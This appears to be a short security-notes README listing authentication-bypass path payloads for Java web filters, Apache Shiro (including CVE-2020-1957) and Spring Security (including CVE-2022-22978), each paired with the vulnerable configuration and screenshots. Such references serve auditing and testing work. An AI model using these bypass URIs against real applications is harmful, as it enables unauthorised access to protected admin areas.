## CustomFilter

### "/admin".equals(requestURI)

```
/admin/
```

![QQ_1725113206194](https://github.com/user-attachments/assets/6e1f88b2-1f7c-4ed9-97d9-ad66436ff765)
![QQ_1725113327786](https://github.com/user-attachments/assets/e7bec3e7-537e-447b-aff3-1ecb31bab4bc)

### requestURI.startsWith("/admin")

```
/;/admin
```

![QQ_1725113769645](https://github.com/user-attachments/assets/b297662c-d7aa-40d8-8563-01fe301de055)
![QQ_1725113780747](https://github.com/user-attachments/assets/783c01b4-82ea-49b2-9d01-4adfb8287fe9)

## shiro

### CVE-2020-1957

```
filterChainDefinitionMap.put("/shiroadmin/**", "authc"); // 需要权限
filterChainDefinitionMap.put("/hello", "anon"); // 匿名访问
```

![QQ_1725116599138](https://github.com/user-attachments/assets/b20ae8a5-0712-4a5a-898e-b1413cc7e169)

![QQ_1725116146495](https://github.com/user-attachments/assets/d0d5ca49-ff5b-4df2-aa18-515f600e2240)

```
/hello/..;/shiroadmin
```

### 配置错误1

```
        filterChainDefinitionMap.put("/shiroadmin/*", "authc"); // 需要权限
        filterChainDefinitionMap.put("/hello", "anon"); // 匿名访问
```

![QQ_1725116823968](https://github.com/user-attachments/assets/d4184b83-23b3-421c-afe9-b48feabb3e23)


![QQ_1725116800064](https://github.com/user-attachments/assets/9978d198-c99d-454a-8ae9-2b190283d78e)

```
/shiroadmin/;/1
```

### 配置错误2

```
        filterChainDefinitionMap.put("/shiroadmin", "authc"); // 需要权限
        filterChainDefinitionMap.put("/hello", "anon"); // 匿名访问
```
![QQ_1725117136916](https://github.com/user-attachments/assets/1d19e68c-1531-4e22-bf5e-89222942f3c6)

![QQ_1725117151677](https://github.com/user-attachments/assets/ea99dc2f-bc22-4f1c-8746-71c75f8d965d)


```
/;/shiroadmin
```

## SpringSecurity

### 低版本spring-boot
https://mp.weixin.qq.com/s/M1FiPKJRAWgwaKCtyNW8eQ

![QQ_1725118394617](https://github.com/user-attachments/assets/5bb01424-7237-4621-b634-b5b0cffe86e4)

```
/securityadmin.11
```

### 配置错误

![QQ_1725118491939](https://github.com/user-attachments/assets/dc1bef56-90b3-4493-88ce-a58568319d00)


![QQ_1725118481419](https://github.com/user-attachments/assets/eb2c31db-ea66-4f9d-bc40-326840b77674)

```
/securityadmin/
```


### 配置错误2

https://l3yx.github.io/2022/07/16/Spring-Security-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-CVE-2022-22978/

![QQ_1725119194163](https://github.com/user-attachments/assets/f158e5de-c668-418a-abf2-272db59daaa2)


```
/securityadmin/%0a
```










